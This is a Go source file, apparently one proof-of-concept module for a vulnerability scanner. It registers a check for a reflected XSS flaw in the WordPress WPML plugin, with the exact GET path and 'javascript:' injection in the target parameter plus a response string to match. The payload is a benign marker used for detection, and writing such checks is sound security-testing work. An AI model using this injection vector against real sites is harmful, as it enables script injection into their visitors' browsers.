package poc

func (Info *PocInfo) WordPress_Wpml_Plugin_XSS_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "wordpress"
	poc.Info.Type = "XSS"
	poc.Info.Name = "WordPress wpml Plugin reflect XSS"
	poc.Info.Level = 3
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/index.php?icl_action=reminder_popup&target=javascript:test(333);//"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = func() map[string]string {
		mapTemp := make(map[string]string)
		mapTemp["Content-Type"] = "application/x-www-form-urlencoded"
		return mapTemp
	}()
	poc.Poc.Data = []string{""}
	poc.Poc.Word = []string{"\"javascript:test(333);//"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
